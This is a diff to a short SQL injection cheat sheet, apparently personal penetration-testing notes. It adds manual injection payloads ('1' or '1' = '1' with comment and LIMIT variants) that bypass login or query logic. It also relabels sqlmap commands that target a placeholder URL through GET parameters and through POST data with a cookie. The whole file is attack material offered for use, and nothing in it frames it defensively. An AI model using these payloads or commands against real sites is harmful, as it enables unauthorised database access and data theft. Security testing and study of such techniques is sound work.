@@ -1,4 +1,9 @@
-# GET Request
+# manual tests
+1' or '1' = '1
+1' or '1' = '1'))/*
+1' or '1' = '1')) LIMIT 1/*
+
+# SQLmap GET Request
 sqlmap -u "http://<url>?id=1&str=val"
-# POST Request with Cookie
+# SQLmap POST Request with Cookie
 sqlmap -u "http://<url>" --data="id=1&str=val" --cookie="cookie1=val1"
